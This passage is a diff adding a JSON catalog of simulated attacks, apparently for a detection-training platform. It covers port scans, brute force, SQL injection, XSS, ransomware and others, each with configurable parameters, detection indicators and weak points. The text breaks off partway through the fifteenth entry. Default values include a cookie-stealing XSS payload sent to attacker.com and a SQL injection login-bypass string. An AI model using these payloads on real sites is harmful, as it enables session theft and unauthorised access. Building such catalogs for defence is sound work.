@@ -1,0 +1,1943 @@
+{
+  "attack_catalog": {
+    "version": "1.0.0",
+    "last_updated": "2025-10-28",
+    "total_attacks": 20,
+    "categories": [
+      "reconnaissance",
+      "initial_access",
+      "execution",
+      "persistence",
+      "privilege_escalation",
+      "defense_evasion",
+      "credential_access",
+      "discovery",
+      "lateral_movement",
+      "collection",
+      "exfiltration",
+      "impact",
+      "command_and_control"
+    ]
+  },
+  "attacks": [
+    {
+      "attack_id": "ATK001",
+      "attack_name": "Port Scanning",
+      "category": "reconnaissance",
+      "difficulty": "easy",
+      "mitre_attack_id": "T1046",
+      "description": "Attacker scans network to discover open ports and services",
+      "typical_duration_seconds": 30,
+      "detection_difficulty": "easy",
+      "user_configurable_parameters": {
+        "scan_type": {
+          "type": "select",
+          "label": "Scan Type",
+          "options": ["TCP Connect Scan", "SYN Scan", "UDP Scan", "Comprehensive Scan"],
+          "default": "SYN Scan",
+          "description": "Type of port scanning technique"
+        },
+        "target_node": {
+          "type": "node_selector",
+          "label": "Target System",
+          "description": "Select which system to scan",
+          "required": true
+        },
+        "port_range": {
+          "type": "text",
+          "label": "Port Range",
+          "default": "1-65535",
+          "description": "Range of ports to scan (e.g., 1-1000 or 80,443,22)"
+        },
+        "scan_speed": {
+          "type": "select",
+          "label": "Scan Speed",
+          "options": ["Slow (Stealthy)", "Normal", "Fast (Aggressive)"],
+          "default": "Normal",
+          "description": "Speed of scan affects detectability"
+        },
+        "source_ip": {
+          "type": "text",
+          "label": "Attacker IP",
+          "default": "185.220.101.34",
+          "description": "Source IP address of attacker"
+        }
+      },
+      "attack_pattern": {
+        "stages": [
+          {
+            "stage": 1,
+            "name": "Port Discovery",
+            "events": [
+              {
+                "event_type": "port_scan",
+                "target_property": "open_ports",
+                "detection_indicators": {
+                  "high_connection_rate": true,
+                  "sequential_port_pattern": true,
+                  "unusual_port_access": true
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "success_conditions": {
+        "discovers_open_ports": true,
+        "identifies_services": true
+      },
+      "expected_ai_detections": [
+        {
+          "detection_type": "anomaly",
+          "confidence_threshold": 0.95,
+          "detection_time_seconds": 3
+        }
+      ],
+      "architecture_vulnerabilities": {
+        "exposed_services": true,
+        "no_firewall_rules": true,
+        "public_facing_ports": true
+      }
+    },
+    {
+      "attack_id": "ATK002",
+      "attack_name": "Brute Force Authentication",
+      "category": "credential_access",
+      "difficulty": "easy",
+      "mitre_attack_id": "T1110",
+      "description": "Attempts to crack passwords by trying multiple combinations",
+      "typical_duration_seconds": 60,
+      "detection_difficulty": "easy",
+      "user_configurable_parameters": {
+        "target_node": {
+          "type": "node_selector",
+          "label": "Target System",
+          "required": true
+        },
+        "target_service": {
+          "type": "select",
+          "label": "Target Service",
+          "options": ["SSH (Port 22)", "RDP (Port 3389)", "Web Login Form", "FTP (Port 21)", "Database"],
+          "default": "SSH (Port 22)"
+        },
+        "attack_method": {
+          "type": "select",
+          "label": "Attack Method",
+          "options": ["Dictionary Attack", "Credential Stuffing", "Password Spraying", "Pure Brute Force"],
+          "default": "Dictionary Attack",
+          "description": "Method used to guess passwords"
+        },
+        "username_list": {
+          "type": "textarea",
+          "label": "Username List",
+          "default": "admin\nroot\nuser\nadministrator",
+          "description": "One username per line"
+        },
+        "password_dictionary": {
+          "type": "select",
+          "label": "Password Dictionary",
+          "options": ["Common Passwords (Top 100)", "RockYou (Top 1000)", "Custom List"],
+          "default": "Common Passwords (Top 100)"
+        },
+        "attempts_per_second": {
+          "type": "number",
+          "label": "Attempts Per Second",
+          "default": 10,
+          "min": 1,
+          "max": 100,
+          "description": "Speed of login attempts"
+        },
+        "source_ip": {
+          "type": "text",
+          "label": "Attacker IP",
+          "default": "45.142.212.61"
+        }
+      },
+      "attack_pattern": {
+        "stages": [
+          {
+            "stage": 1,
+            "name": "Credential Guessing",
+            "events": [
+              {
+                "event_type": "authentication_attempt",
+                "detection_indicators": {
+                  "failed_login_attempts": true,
+                  "rapid_succession": true,
+                  "dictionary_pattern": true
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "success_conditions": {
+        "gains_access": "conditional",
+        "weak_password_found": "conditional"
+      },
+      "architecture_vulnerabilities": {
+        "weak_password_policy": true,
+        "no_account_lockout": true,
+        "no_mfa": true,
+        "exposed_authentication_service": true
+      }
+    },
+    {
+      "attack_id": "ATK003",
+      "attack_name": "SQL Injection",
+      "category": "initial_access",
+      "difficulty": "medium",
+      "mitre_attack_id": "T1190",
+      "description": "Injects malicious SQL code into web application to bypass authentication or extract data",
+      "typical_duration_seconds": 45,
+      "detection_difficulty": "medium",
+      "user_configurable_parameters": {
+        "target_node": {
+          "type": "node_selector",
+          "label": "Target Web Server",
+          "filter": "type:web_server",
+          "required": true
+        },
+        "injection_point": {
+          "type": "select",
+          "label": "Injection Point",
+          "options": ["Login Form", "Search Box", "URL Parameter", "Cookie", "HTTP Header"],
+          "default": "Login Form"
+        },
+        "injection_type": {
+          "type": "select",
+          "label": "SQL Injection Type",
+          "options": [
+            "Authentication Bypass",
+            "UNION-based",
+            "Error-based",
+            "Blind SQL Injection",
+            "Time-based Blind"
+          ],
+          "default": "Authentication Bypass"
+        },
+        "payload": {
+          "type": "textarea",
+          "label": "SQL Payload",
+          "default": "' OR '1'='1' --",
+          "description": "Custom SQL injection payload"
+        },
+        "automated_tool": {
+          "type": "select",
+          "label": "Tool Used",
+          "options": ["Manual", "SQLMap", "Havij", "jSQL Injection"],
+          "default": "Manual"
+        },
+        "target_database": {
+          "type": "node_selector",
+          "label": "Connected Database",
+          "filter": "type:database",
+          "optional": true
+        }
+      },
+      "attack_pattern": {
+        "stages": [
+          {
+            "stage": 1,
+            "name": "SQL Injection Attempt",
+            "events": [
+              {
+                "event_type": "sql_injection_attempt",
+                "detection_indicators": {
+                  "sql_keywords_present": true,
+                  "special_characters": true,
+                  "suspicious_logic_operators": true,
+                  "comment_syntax": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 2,
+            "name": "Data Extraction",
+            "events": [
+              {
+                "event_type": "database_query",
+                "detection_indicators": {
+                  "unusual_query_pattern": true,
+                  "large_data_return": true
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "vulnerability_requirements": {
+        "unsanitized_input": true,
+        "no_prepared_statements": true
+      },
+      "architecture_vulnerabilities": {
+        "no_input_validation": true,
+        "no_waf": true,
+        "direct_db_connection": true,
+        "verbose_error_messages": true
+      }
+    },
+    {
+      "attack_id": "ATK004",
+      "attack_name": "Distributed Denial of Service (DDoS)",
+      "category": "impact",
+      "difficulty": "medium",
+      "mitre_attack_id": "T1498",
+      "description": "Overwhelms target with massive traffic to make it unavailable",
+      "typical_duration_seconds": 120,
+      "detection_difficulty": "easy",
+      "user_configurable_parameters": {
+        "target_node": {
+          "type": "node_selector",
+          "label": "Target System",
+          "required": true
+        },
+        "attack_type": {
+          "type": "select",
+          "label": "DDoS Type",
+          "options": [
+            "HTTP Flood",
+            "SYN Flood",
+            "UDP Flood",
+            "Slowloris",
+            "Ping Flood (ICMP)",
+            "Application Layer Attack"
+          ],
+          "default": "HTTP Flood"
+        },
+        "traffic_volume": {
+          "type": "select",
+          "label": "Traffic Volume",
+          "options": ["Low (1K req/s)", "Medium (10K req/s)", "High (50K req/s)", "Massive (100K+ req/s)"],
+          "default": "Medium (10K req/s)"
+        },
+        "botnet_size": {
+          "type": "number",
+          "label": "Number of Bots",
+          "default": 1000,
+          "min": 10,
+          "max": 100000,
+          "description": "Number of infected machines in botnet"
+        },
+        "geographic_distribution": {
+          "type": "multiselect",
+          "label": "Bot Locations",
+          "options": ["North America", "Europe", "Asia", "South America", "Africa", "Oceania"],
+          "default": ["North America", "Europe", "Asia"]
+        },
+        "attack_duration": {
+          "type": "number",
+          "label": "Attack Duration (seconds)",
+          "default": 120,
+          "min": 10,
+          "max": 600
+        }
+      },
+      "attack_pattern": {
+        "stages": [
+          {
+            "stage": 1,
+            "name": "Traffic Flood",
+            "events": [
+              {
+                "event_type": "ddos_flood",
+                "detection_indicators": {
+                  "traffic_spike": true,
+                  "distributed_sources": true,
+                  "repetitive_patterns": true,
+                  "resource_exhaustion": true
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "impact": {
+        "service_degradation": true,
+        "potential_downtime": true
+      },
+      "architecture_vulnerabilities": {
+        "no_rate_limiting": true,
+        "no_ddos_protection": true,
+        "insufficient_bandwidth": true,
+        "single_point_of_failure": true
+      }
+    },
+    {
+      "attack_id": "ATK005",
+      "attack_name": "Malware C2 Communication",
+      "category": "command_and_control",
+      "difficulty": "medium",
+      "mitre_attack_id": "T1071",
+      "description": "Infected system communicates with attacker's command and control server",
+      "typical_duration_seconds": 180,
+      "detection_difficulty": "medium",
+      "user_configurable_parameters": {
+        "infected_node": {
+          "type": "node_selector",
+          "label": "Infected System",
+          "required": true
+        },
+        "malware_type": {
+          "type": "select",
+          "label": "Malware Type",
+          "options": ["RAT (Remote Access Trojan)", "Ransomware", "Banking Trojan", "Botnet Agent", "Spyware"],
+          "default": "RAT (Remote Access Trojan)"
+        },
+        "c2_protocol": {
+          "type": "select",
+          "label": "C2 Protocol",
+          "options": ["HTTP/HTTPS", "DNS Tunneling", "IRC", "Custom Protocol", "Encrypted Channel"],
+          "default": "HTTPS"
+        },
+        "c2_server_ip": {
+          "type": "text",
+          "label": "C2 Server IP",
+          "default": "45.67.89.123"
+        },
+        "beacon_interval": {
+          "type": "number",
+          "label": "Beacon Interval (seconds)",
+          "default": 60,
+          "min": 10,
+          "max": 3600,
+          "description": "How often malware calls home"
+        },
+        "data_exfiltration": {
+          "type": "boolean",
+          "label": "Include Data Exfiltration",
+          "default": true
+        },
+        "persistence_mechanism": {
+          "type": "select",
+          "label": "Persistence Method",
+          "options": ["Registry (Windows)", "Cron Job (Linux)", "Service", "Startup Folder", "None"],
+          "default": "Service"
+        }
+      },
+      "attack_pattern": {
+        "stages": [
+          {
+            "stage": 1,
+            "name": "Initial Beacon",
+            "events": [
+              {
+                "event_type": "c2_communication",
+                "detection_indicators": {
+                  "periodic_connections": true,
+                  "unusual_destination": true,
+                  "suspicious_user_agent": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 2,
+            "name": "Command Execution",
+            "events": [
+              {
+                "event_type": "remote_command",
+                "detection_indicators": {
+                  "unusual_process_execution": true,
+                  "privilege_escalation_attempt": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 3,
+            "name": "Data Exfiltration",
+            "events": [
+              {
+                "event_type": "data_upload",
+                "detection_indicators": {
+                  "large_outbound_transfer": true,
+                  "encrypted_traffic": true
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "architecture_vulnerabilities": {
+        "no_egress_filtering": true,
+        "no_c2_detection": true,
+        "weak_endpoint_protection": true
+      }
+    },
+    {
+      "attack_id": "ATK006",
+      "attack_name": "Cross-Site Scripting (XSS)",
+      "category": "initial_access",
+      "difficulty": "medium",
+      "mitre_attack_id": "T1189",
+      "description": "Injects malicious JavaScript into web pages to steal user data",
+      "typical_duration_seconds": 30,
+      "detection_difficulty": "medium",
+      "user_configurable_parameters": {
+        "target_node": {
+          "type": "node_selector",
+          "label": "Target Web Server",
+          "filter": "type:web_server",
+          "required": true
+        },
+        "xss_type": {
+          "type": "select",
+          "label": "XSS Type",
+          "options": ["Reflected XSS", "Stored XSS", "DOM-based XSS"],
+          "default": "Stored XSS"
+        },
+        "injection_point": {
+          "type": "select",
+          "label": "Injection Point",
+          "options": ["Comment Section", "User Profile", "Search Box", "Contact Form", "URL Parameter"],
+          "default": "Comment Section"
+        },
+        "payload": {
+          "type": "textarea",
+          "label": "XSS Payload",
+          "default": "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
+          "description": "Malicious JavaScript code"
+        },
+        "target_action": {
+          "type": "select",
+          "label": "Attack Goal",
+          "options": ["Steal Cookies", "Keylogging", "Session Hijacking", "Phishing Redirect", "Crypto Mining"],
+          "default": "Steal Cookies"
+        }
+      },
+      "attack_pattern": {
+        "stages": [
+          {
+            "stage": 1,
+            "name": "Script Injection",
+            "events": [
+              {
+                "event_type": "xss_injection",
+                "detection_indicators": {
+                  "script_tags_in_input": true,
+                  "html_entities": true,
+                  "javascript_keywords": true
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "architecture_vulnerabilities": {
+        "no_output_encoding": true,
+        "no_csp": true,
+        "no_input_sanitization": true
+      }
+    },
+    {
+      "attack_id": "ATK007",
+      "attack_name": "Lateral Movement",
+      "category": "lateral_movement",
+      "difficulty": "hard",
+      "mitre_attack_id": "T1021",
+      "description": "Attacker moves from compromised system to other systems in the network",
+      "typical_duration_seconds": 90,
+      "detection_difficulty": "medium",
+      "user_configurable_parameters": {
+        "initial_compromised_node": {
+          "type": "node_selector",
+          "label": "Initially Compromised System",
+          "required": true
+        },
+        "target_node": {
+          "type": "node_selector",
+          "label": "Target System to Access",
+          "required": true
+        },
+        "movement_technique": {
+          "type": "select",
+          "label": "Lateral Movement Technique",
+          "options": [
+            "Pass-the-Hash",
+            "Pass-the-Ticket",
+            "RDP",
+            "SMB/Windows Admin Shares",
+            "SSH",
+            "WMI (Windows Management Instrumentation)",
+            "PsExec"
+          ],
+          "default": "SMB/Windows Admin Shares"
+        },
+        "credentials_obtained": {
+          "type": "select",
+          "label": "Credentials Used",
+          "options": ["Stolen Credentials", "Cached Credentials", "Credential Dumping", "Default Credentials"],
+          "default": "Stolen Credentials"
+        },
+        "privilege_level": {
+          "type": "select",
+          "label": "Access Level Gained",
+          "options": ["User", "Administrator", "Domain Admin", "System/Root"],
+          "default": "Administrator"
+        }
+      },
+      "attack_pattern": {
+        "stages": [
+          {
+            "stage": 1,
+            "name": "Internal Reconnaissance",
+            "events": [
+              {
+                "event_type": "internal_port_scan",
+                "detection_indicators": {
+                  "unusual_internal_scanning": true,
+                  "service_enumeration": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 2,
+            "name": "Credential Access",
+            "events": [
+              {
+                "event_type": "credential_dump",
+                "detection_indicators": {
+                  "lsass_access": true,
+                  "memory_dump": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 3,
+            "name": "Remote Connection",
+            "events": [
+              {
+                "event_type": "lateral_movement_connection",
+                "detection_indicators": {
+                  "unusual_source_destination": true,
+                  "abnormal_authentication": true,
+                  "admin_share_access": true
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "architecture_vulnerabilities": {
+        "flat_network": true,
+        "no_network_segmentation": true,
+        "shared_local_admin_passwords": true,
+        "no_lateral_movement_detection": true
+      }
+    },
+    {
+      "attack_id": "ATK008",
+      "attack_name": "Data Exfiltration",
+      "category": "exfiltration",
+      "difficulty": "medium",
+      "mitre_attack_id": "T1041",
+      "description": "Stealing sensitive data from the network",
+      "typical_duration_seconds": 120,
+      "detection_difficulty": "medium",
+      "user_configurable_parameters": {
+        "source_node": {
+          "type": "node_selector",
+          "label": "Source System (Data Location)",
+          "required": true
+        },
+        "data_type": {
+          "type": "multiselect",
+          "label": "Data Type",
+          "options": ["Customer Database", "Financial Records", "Source Code", "Intellectual Property", "Employee Data", "Credentials"],
+          "default": ["Customer Database"]
+        },
+        "data_volume_mb": {
+          "type": "number",
+          "label": "Data Volume (MB)",
+          "default": 500,
+          "min": 1,
+          "max": 100000
+        },
+        "exfiltration_method": {
+          "type": "select",
+          "label": "Exfiltration Method",
+          "options": [
+            "Direct Upload (HTTP/HTTPS)",
+            "DNS Tunneling",
+            "Email Attachment",
+            "Cloud Storage Upload",
+            "FTP",
+            "Encrypted Channel",
+            "Steganography"
+          ],
+          "default": "Direct Upload (HTTPS)"
+        },
+        "destination_ip": {
+          "type": "text",
+          "label": "Destination IP/Domain",
+          "default": "45.67.89.123"
+        },
+        "compression": {
+          "type": "boolean",
+          "label": "Compress Data",
+          "default": true
+        },
+        "encryption": {
+          "type": "boolean",
+          "label": "Encrypt Data",
+          "default": true
+        }
+      },
+      "attack_pattern": {
+        "stages": [
+          {
+            "stage": 1,
+            "name": "Data Collection",
+            "events": [
+              {
+                "event_type": "data_access",
+                "detection_indicators": {
+                  "bulk_data_read": true,
+                  "unusual_file_access": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 2,
+            "name": "Data Staging",
+            "events": [
+              {
+                "event_type": "file_compression",
+                "detection_indicators": {
+                  "archive_creation": true,
+                  "unusual_file_operations": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 3,
+            "name": "Data Upload",
+            "events": [
+              {
+                "event_type": "data_upload",
+                "detection_indicators": {
+                  "large_outbound_transfer": true,
+                  "unusual_destination": true,
+                  "off_hours_activity": true
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "architecture_vulnerabilities": {
+        "no_dlp": true,
+        "no_data_classification": true,
+        "unrestricted_outbound_access": true
+      }
+    },
+    {
+      "attack_id": "ATK009",
+      "attack_name": "Phishing Attack",
+      "category": "initial_access",
+      "difficulty": "easy",
+      "mitre_attack_id": "T1566",
+      "description": "Social engineering attack via malicious email",
+      "typical_duration_seconds": 60,
+      "detection_difficulty": "hard",
+      "user_configurable_parameters": {
+        "target_users": {
+          "type": "node_selector",
+          "label": "Target Users",
+          "filter": "type:user_workstation,type:mobile_device",
+          "multiple": true,
+          "required": true
+        },
+        "phishing_type": {
+          "type": "select",
+          "label": "Phishing Type",
+          "options": ["Spear Phishing", "Whaling (Executive)", "Clone Phishing", "Vishing (Voice)", "Smishing (SMS)"],
+          "default": "Spear Phishing"
+        },
+        "attack_vector": {
+          "type": "select",
+          "label": "Attack Vector",
+          "options": ["Malicious Link", "Malicious Attachment", "Credential Harvesting Form", "Fake Login Page"],
+          "default": "Malicious Link"
+        },
+        "email_subject": {
+          "type": "text",
+          "label": "Email Subject",
+          "default": "URGENT: Account Security Alert"
+        },
+        "sender_spoofing": {
+          "type": "select",
+          "label": "Spoofed Sender",
+          "options": ["CEO", "IT Department", "Bank", "Popular Service (Amazon, Microsoft)", "Colleague"],
+          "default": "IT Department"
+        },
+        "success_rate": {
+          "type": "slider",
+          "label": "Click Rate %",
+          "default": 30,
+          "min": 0,
+          "max": 100,
+          "description": "Percentage of users who click/fall for phishing"
+        }
+      },
+      "attack_pattern": {
+        "stages": [
+          {
+            "stage": 1,
+            "name": "Email Delivery",
+            "events": [
+              {
+                "event_type": "phishing_email",
+                "detection_indicators": {
+                  "sender_domain_mismatch": true,
+                  "urgent_language": true,
+                  "suspicious_links": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 2,
+            "name": "User Interaction",
+            "events": [
+              {
+                "event_type": "user_click",
+                "detection_indicators": {
+                  "credential_submission": true,
+                  "malware_download": true
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "architecture_vulnerabilities": {
+        "no_email_filtering": true,
+        "no_spf_dkim_dmarc": true,
+        "no_security_awareness_training": true,
+        "no_link_sandboxing": true
+      }
+    },
+    {
+      "attack_id": "ATK010",
+      "attack_name": "Privilege Escalation",
+      "category": "privilege_escalation",
+      "difficulty": "hard",
+      "mitre_attack_id": "T1068",
+      "description": "Gaining higher privileges on a compromised system",
+      "typical_duration_seconds": 45,
+      "detection_difficulty": "medium",
+      "user_configurable_parameters": {
+        "compromised_node": {
+          "type": "node_selector",
+          "label": "Compromised System",
+          "required": true
+        },
+        "current_privilege": {
+          "type": "select",
+          "label": "Current Privilege Level",
+          "options": ["Guest", "Standard User", "Power User"],
+          "default": "Standard User"
+        },
+        "target_privilege": {
+          "type": "select",
+          "label": "Target Privilege Level",
+          "options": ["Administrator", "System/Root", "Domain Admin"],
+          "default": "Administrator"
+        },
+        "exploit_method": {
+          "type": "select",
+          "label": "Escalation Method",
+          "options": [
+            "Kernel Exploit",
+            "Sudo Misconfiguration",
+            "DLL Hijacking",
+            "Token Impersonation",
+            "UAC Bypass",
+            "Scheduled Task Abuse",
+            "Service Misconfiguration"
+          ],
+          "default": "Kernel Exploit"
+        },
+        "exploit_cve": {
+          "type": "text",
+          "label": "CVE (if applicable)",
+          "default": "CVE-2021-3156 (Sudo)",
+          "optional": true
+        }
+      },
+      "attack_pattern": {
+        "stages": [
+          {
+            "stage": 1,
+            "name": "Vulnerability Discovery",
+            "events": [
+              {
+                "event_type": "privilege_check",
+                "detection_indicators": {
+                  "unusual_privilege_queries": true,
+                  "enumeration_commands": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 2,
+            "name": "Exploit Execution",
+            "events": [
+              {
+                "event_type": "privilege_escalation_attempt",
+                "detection_indicators": {
+                  "kernel_exploit": true,
+                  "unusual_process_privileges": true,
+                  "suspicious_dll_load": true
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "architecture_vulnerabilities": {
+        "unpatched_systems": true,
+        "weak_service_permissions": true,
+        "no_privilege_monitoring": true
+      }
+    },
+    {
+      "attack_id": "ATK011",
+      "attack_name": "Ransomware Attack",
+      "category": "impact",
+      "difficulty": "hard",
+      "mitre_attack_id": "T1486",
+      "description": "Encrypts files and demands ransom payment",
+      "typical_duration_seconds": 180,
+      "detection_difficulty": "easy",
+      "user_configurable_parameters": {
+        "target_node": {
+          "type": "node_selector",
+          "label": "Target System",
+          "required": true
+        },
+        "ransomware_variant": {
+          "type": "select",
+          "label": "Ransomware Type",
+          "options": ["Locker Ransomware", "Crypto Ransomware", "Double Extortion", "RaaS (Ransomware-as-a-Service)"],
+          "default": "Crypto Ransomware"
+        },
+        "encryption_speed": {
+          "type": "select",
+          "label": "Encryption Speed",
+          "options": ["Slow (Stealthy)", "Normal", "Fast (Aggressive)"],
+          "default": "Fast (Aggressive)"
+        },
+        "file_types_targeted": {
+          "type": "multiselect",
+          "label": "Target File Types",
+          "options": [".doc", ".pdf", ".jpg", ".sql", ".db", ".backup", "All Files"],
+          "default": [".doc", ".pdf", ".sql", ".db"]
+        },
+        "ransom_amount_btc": {
+          "type": "number",
+          "label": "Ransom Amount (BTC)",
+          "default": 5,
+          "min": 0.1,
+          "max": 100
+        },
+        "deletes_backups": {
+          "type": "boolean",
+          "label": "Delete Backups/Shadow Copies",
+          "default": true
+        },
+        "lateral_spread": {
+          "type": "boolean",
+          "label": "Spread to Network",
+          "default": true
+        }
+      },
+      "attack_pattern": {
+        "stages": [
+          {
+            "stage": 1,
+            "name": "Backup Deletion",
+            "events": [
+              {
+                "event_type": "backup_deletion",
+                "detection_indicators": {
+                  "shadow_copy_deletion": true,
+                  "backup_file_deletion": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 2,
+            "name": "File Encryption",
+            "events": [
+              {
+                "event_type": "mass_file_encryption",
+                "detection_indicators": {
+                  "high_file_modification_rate": true,
+                  "file_extension_changes": true,
+                  "entropy_increase": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 3,
+            "name": "Ransom Note",
+            "events": [
+              {
+                "event_type": "ransom_note_drop",
+                "detection_indicators": {
+                  "readme_file_creation": true,
+                  "desktop_wallpaper_change": true
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "architecture_vulnerabilities": {
+        "no_backup_strategy": true,
+        "no_offline_backups": true,
+        "no_file_integrity_monitoring": true,
+        "weak_endpoint_protection": true
+      }
+    },
+    {
+      "attack_id": "ATK012",
+      "attack_name": "Man-in-the-Middle (MitM)",
+      "category": "credential_access",
+      "difficulty": "hard",
+      "mitre_attack_id": "T1557",
+      "description": "Intercepts communication between two parties",
+      "typical_duration_seconds": 90,
+      "detection_difficulty": "hard",
+      "user_configurable_parameters": {
+        "source_node": {
+          "type": "node_selector",
+          "label": "Source (e.g., User)",
+          "required": true
+        },
+        "target_node": {
+          "type": "node_selector",
+          "label": "Target (e.g., Server)",
+          "required": true
+        },
+        "attack_method": {
+          "type": "select",
+          "label": "MitM Technique",
+          "options": [
+            "ARP Spoofing",
+            "DNS Spoofing",
+            "SSL Stripping",
+            "Rogue Access Point",
+            "BGP Hijacking",
+            "DHCP Spoofing"
+          ],
+          "default": "ARP Spoofing"
+        },
+        "traffic_to_intercept": {
+          "type": "multiselect",
+          "label": "Traffic Types",
+          "options": ["HTTP", "HTTPS", "FTP", "Email", "Database", "VoIP"],
+          "default": ["HTTP", "HTTPS"]
+        },
+        "attacker_position": {
+          "type": "select",
+          "label": "Attacker Position",
+          "options": ["Same Network", "ISP Level", "Internet Gateway", "WiFi Network"],
+          "default": "Same Network"
+        },
+        "credential_capture": {
+          "type": "boolean",
+          "label": "Capture Credentials",
+          "default": true
+        }
+      },
+      "attack_pattern": {
+        "stages": [
+          {
+            "stage": 1,
+            "name": "Traffic Interception",
+            "events": [
+              {
+                "event_type": "mitm_setup",
+                "detection_indicators": {
+                  "arp_cache_poisoning": true,
+                  "duplicate_ip_address": true,
+                  "unusual_gateway_mac": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 2,
+            "name": "Data Capture",
+            "events": [
+              {
+                "event_type": "traffic_interception",
+                "detection_indicators": {
+                  "certificate_warnings": true,
+                  "increased_latency": true,
+                  "ssl_downgrade": true
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "architecture_vulnerabilities": {
+        "no_encryption": true,
+        "no_certificate_pinning": true,
+        "weak_network_segmentation": true,
+        "no_arp_inspection": true
+      }
+    },
+    {
+      "attack_id": "ATK013",
+      "attack_name": "Zero-Day Exploit",
+      "category": "execution",
+      "difficulty": "hard",
+      "mitre_attack_id": "T1203",
+      "description": "Exploits unknown vulnerability before patch is available",
+      "typical_duration_seconds": 60,
+      "detection_difficulty": "hard",
+      "user_configurable_parameters": {
+        "target_node": {
+          "type": "node_selector",
+          "label": "Target System",
+          "required": true
+        },
+        "vulnerability_type": {
+          "type": "select",
+          "label": "Vulnerability Type",
+          "options": [
+            "Buffer Overflow",
+            "Remote Code Execution",
+            "Use-After-Free",
+            "Integer Overflow",
+            "SQL Injection (0-day)",
+            "Authentication Bypass"
+          ],
+          "default": "Remote Code Execution"
+        },
+        "target_software": {
+          "type": "select",
+          "label": "Target Software",
+          "options": [
+            "Operating System",
+            "Web Browser",
+            "Office Suite",
+            "PDF Reader",
+            "Media Player",
+            "Web Server",
+            "Database"
+          ],
+          "default": "Web Browser"
+        },
+        "exploit_complexity": {
+          "type": "select",
+          "label": "Exploit Complexity",
+          "options": ["Low", "Medium", "High"],
+          "default": "High"
+        },
+        "payload_type": {
+          "type": "select",
+          "label": "Payload",
+          "options": ["Backdoor", "Reverse Shell", "Dropper", "Ransomware", "Spyware"],
+          "default": "Reverse Shell"
+        }
+      },
+      "attack_pattern": {
+        "stages": [
+          {
+            "stage": 1,
+            "name": "Exploit Delivery",
+            "events": [
+              {
+                "event_type": "zero_day_exploit",
+                "detection_indicators": {
+                  "unusual_crash": true,
+                  "unexpected_behavior": true,
+                  "anomalous_memory_access": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 2,
+            "name": "Payload Execution",
+            "events": [
+              {
+                "event_type": "code_execution",
+                "detection_indicators": {
+                  "unauthorized_process": true,
+                  "privilege_elevation": true
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "architecture_vulnerabilities": {
+        "unpatched_software": true,
+        "no_exploit_prevention": true,
+        "no_behavioral_analysis": true,
+        "permissive_execution_policies": true
+      }
+    },
+    {
+      "attack_id": "ATK014",
+      "attack_name": "Insider Threat",
+      "category": "collection",
+      "difficulty": "medium",
+      "mitre_attack_id": "T1530",
+      "description": "Malicious or negligent employee abuses access privileges",
+      "typical_duration_seconds": 300,
+      "detection_difficulty": "hard",
+      "user_configurable_parameters": {
+        "insider_node": {
+          "type": "node_selector",
+          "label": "Insider's Workstation",
+          "required": true
+        },
+        "insider_type": {
+          "type": "select",
+          "label": "Insider Type",
+          "options": [
+            "Malicious (Intentional)",
+            "Negligent (Accidental)",
+            "Compromised Account",
+            "Disgruntled Employee"
+          ],
+          "default": "Malicious (Intentional)"
+        },
+        "access_level": {
+          "type": "select",
+          "label": "Insider Access Level",
+          "options": ["Standard User", "Privileged User", "Administrator", "Executive"],
+          "default": "Privileged User"
+        },
+        "target_data": {
+          "type": "multiselect",
+          "label": "Target Data",
+          "options": [
+            "Customer Data",
+            "Financial Information",
+            "Trade Secrets",
+            "Source Code",
+            "Strategic Plans",
+            "Employee Records"
+          ],
+          "default": ["Customer Data", "Trade Secrets"]
+        },
+        "exfiltration_method": {
+          "type": "select",
+          "label": "Data Theft Method",
+          "options": [
+            "USB Drive",
+            "Cloud Upload",
+            "Email to Personal Account",
+            "Print Documents",
+            "Mobile Device Photo",
+            "Unauthorized API Access"
+          ],
+          "default": "Cloud Upload"
+        },
+        "data_volume_gb": {
+          "type": "number",
+          "label": "Data Volume (GB)",
+          "default": 10,
+          "min": 0.1,
+          "max": 1000
+        }
+      },
+      "attack_pattern": {
+        "stages": [
+          {
+            "stage": 1,
+            "name": "Data Access",
+            "events": [
+              {
+                "event_type": "authorized_data_access",
+                "detection_indicators": {
+                  "unusual_access_volume": true,
+                  "off_hours_access": true,
+                  "accessing_unrelated_data": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 2,
+            "name": "Data Collection",
+            "events": [
+              {
+                "event_type": "data_download",
+                "detection_indicators": {
+                  "bulk_download": true,
+                  "download_before_resignation": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 3,
+            "name": "Data Exfiltration",
+            "events": [
+              {
+                "event_type": "insider_exfiltration",
+                "detection_indicators": {
+                  "usb_device_usage": true,
+                  "cloud_upload_spike": true,
+                  "personal_email_usage": true
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "architecture_vulnerabilities": {
+        "no_user_behavior_analytics": true,
+        "excessive_permissions": true,
+        "no_dlp": true,
+        "no_usb_restrictions": true,
+        "weak_access_controls": true
+      }
+    },
+    {
+      "attack_id": "ATK015",
+      "attack_name": "Supply Chain Attack",
+      "category": "initial_access",
+      "difficulty": "hard",
+      "mitre_attack_id": "T1195",
+      "description": "Compromises software or hardware in the supply chain",
